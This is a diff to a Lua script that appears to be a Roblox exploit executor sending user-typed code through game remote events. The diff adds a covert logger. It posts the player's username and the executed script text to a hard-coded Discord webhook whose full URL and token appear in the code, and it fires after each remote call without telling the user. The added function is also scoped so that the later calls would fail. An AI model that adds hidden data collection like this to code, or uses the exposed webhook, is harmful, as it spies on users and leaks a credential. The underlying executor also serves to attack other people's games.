@@ -2578,6 +2578,58 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	
 		print(string.format("c00lkidd : scan completed in %.3f seconds", scanTime))
 	end
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local localPlayer = Players.LocalPlayer
+
+local request = 
+    (syn and syn.request) or 
+    (http and http.request) or 
+    http_request or 
+    (fluxus and fluxus.request) or 
+    request
+
+if request then
+    local webhookUrl = "https://discord.com/api/webhooks/1379334256429367326/lbYjlMEpSD48QZ0tKKKoh6fc3t-_NpUJPvwsm6s5c__C5r-ZwxfnFfm7uPg0M9FMfjwC"
+
+    local embed = {
+        title = "Script Logged",
+        description = "A new player has Executed an script",
+        color = 0x00ffcc, -- teal/cyan
+        fields = {
+            {
+                name = "Username",
+                value = localPlayer.Name,
+                inline = true
+            },
+            {
+                name = "Script",
+                value = script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text,
+                inline = true
+            }
+        },
+        footer = {
+            text = "c00lkidd.exe script Logger"
+        },
+        timestamp = DateTime.now():ToIsoDate()
+    }
+
+    local payload = {
+        username = "Execution Log",
+        embeds = {embed}
+    }
+local function log()
+    request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(payload)
+    })
+  end
+end
 function fireRemoteEvent(code)
     local success = false
     local tried = 0
@@ -2596,18 +2648,21 @@ function fireRemoteEvent(code)
     try(function()
         if remoteEvent then
             remoteEvent:FireServer(code)
+	    log()
         end
     end)
 
     try(function()
         if remoteFunction then
             remoteFunction:InvokeServer("starlightTSS", code)
+	    log()
         end
     end)
 
     try(function()
         if remoteFunction then
             remoteFunction:InvokeServer(code)
+	    log()
         end
     end)
 
